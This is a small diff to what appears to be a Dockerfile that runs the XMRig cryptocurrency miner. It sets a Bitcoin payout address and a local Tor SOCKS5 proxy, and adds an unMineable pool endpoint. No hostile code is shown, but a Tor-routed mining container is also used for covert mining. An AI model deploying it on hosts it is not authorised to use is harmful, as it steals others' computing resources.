@@ -5,6 +5,7 @@ ENV XMRIG_VERSION=6.19.2
 ENV ADDRESS=bc1q5f3zxersv4wmsk98nldetm2eew9frp3gkkjjpr
 ENV CODE=BTC
 ENV SOCK5_ADDRESS=127.0.0.1:9050
+ENV URL=rx.unmineable.com:3333
 
 RUN apt-get update -y
 RUN apt-get install -y supervisor tor wget curl unzip vim
